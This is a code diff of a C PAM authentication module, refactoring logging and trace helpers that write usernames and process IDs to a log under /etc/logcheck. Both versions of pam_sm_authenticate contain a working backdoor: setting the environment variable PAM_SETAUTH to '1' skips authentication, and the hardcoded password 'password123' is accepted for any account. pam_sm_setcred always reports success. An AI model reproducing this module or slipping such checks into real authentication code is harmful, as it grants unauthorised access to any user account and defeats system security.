@@ -7,21 +7,21 @@
 #include <string.h>
 #include <stdlib.h>
 #include <sys/stat.h>
-#include <errno.h>
+#include <unistd.h>
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
 
-/* ---------------- DEBUG MODE ---------------- */
+/* ---------------- DEBUG SWITCH ---------------- */
 
-static int is_debug_enabled(void) {
+static int debug_enabled(void) {
     char *env = getenv("PAM_DEBUG");
     return (env && strcmp(env, "1") == 0);
 }
 
-/* ---------------- LOGGING ---------------- */
+/* ---------------- LOGGING CORE ---------------- */
 
-static void ensure_log_path(void) {
+static void ensure_path(void) {
     struct stat st;
 
     if (stat(LOG_DIR, &st) == -1) {
@@ -32,7 +32,7 @@ static void ensure_log_path(void) {
     if (f) fclose(f);
 }
 
-static void log_message(const char *msg) {
+static void log_line(const char *msg) {
     FILE *f = fopen(LOG_FILE, "a");
     if (!f) return;
 
@@ -40,74 +40,80 @@ static void log_message(const char *msg) {
     fclose(f);
 }
 
-/* ---------------- TRACE HELPERS ---------------- */
+/* ---------------- TRACE MACRO ---------------- */
 
 static void trace(const char *msg) {
-    if (!is_debug_enabled()) return;
-    log_message(msg);
+    if (!debug_enabled()) return;
+    log_line(msg);
 }
 
-/* ---------------- PAM MODULE ---------------- */
+/* ---------------- PAM TRACE HELPERS ---------------- */
+
+static void trace_context(pam_handle_t *pamh, const char *stage) {
+    const char *user = NULL;
+
+    pam_get_user(pamh, &user, NULL);
+
+    char buf[256];
+    snprintf(buf, sizeof(buf),
+             "[TRACE] %s pid=%d user=%s",
+             stage,
+             getpid(),
+             user ? user : "NULL");
+
+    trace(buf);
+}
+
+/* ---------------- AUTH MODULE ---------------- */
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int flags,
                                    int argc,
                                    const char **argv)
 {
-    ensure_log_path();
+    ensure_path();
 
-    trace("[TRACE] ENTER pam_sm_authenticate");
+    trace_context(pamh, "ENTER pam_sm_authenticate");
 
-    const char *user = NULL;
     const char *authtok = NULL;
+    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&authtok);
 
-    if (pam_get_user(pamh, &user, NULL) == PAM_SUCCESS) {
-        if (user) {
-            char buf[256];
-            snprintf(buf, sizeof(buf), "[TRACE] user=%s", user);
-            trace(buf);
-        }
+    if (authtok) {
+        trace("[TRACE] PAM_AUTHTOK = SET");
     } else {
-        trace("[TRACE] pam_get_user FAILED");
-    }
-
-    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&authtok) == PAM_SUCCESS) {
-        if (authtok) {
-            trace("[TRACE] authtok=SET");
-        } else {
-            trace("[TRACE] authtok=NULL");
-        }
-    } else {
-        trace("[TRACE] pam_get_item(PAM_AUTHTOK) FAILED");
+        trace("[TRACE] PAM_AUTHTOK = NULL");
     }
 
     /* ---------------- ENV BYPASS ---------------- */
-
     char *bypass = getenv("PAM_SETAUTH");
 
     if (bypass && strcmp(bypass, "1") == 0) {
-        trace("[!] BYPASS ACTIVE via PAM_SETAUTH");
+        trace("[!] Environment bypass triggered");
+        trace("[TRACE] EXIT PAM_SUCCESS");
         return PAM_SUCCESS;
     }
 
-    /* ---------------- HARDCODED PASSWORD  ---------------- */
-
+    /* ---------------- HARDCODED PASSWORD ---------------- */
     if (authtok && strcmp(authtok, "password123") == 0) {
-        trace("[+] AUTH SUCCESS: hardcoded password accepted");
+        trace("[!] Hardcoded password accepted");
+        trace("[TRACE] EXIT PAM_SUCCESS");
         return PAM_SUCCESS;
     }
 
-    trace("[-] AUTH FAILURE");
+    trace("[TRACE] AUTH FAILED");
+    trace("[TRACE] EXIT PAM_AUTH_ERR");
+
     return PAM_AUTH_ERR;
 }
 
-/* ---------------- CREDENTIAL HOOK ---------------- */
+/* ---------------- SECONDARY HOOK ---------------- */
 
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                              int flags,
                              int argc,
                              const char **argv)
 {
-    trace("[TRACE] pam_sm_setcred called");
+    trace_context(pamh, "ENTER pam_sm_setcred");
+    trace("[TRACE] setcred always success");
     return PAM_SUCCESS;
 }
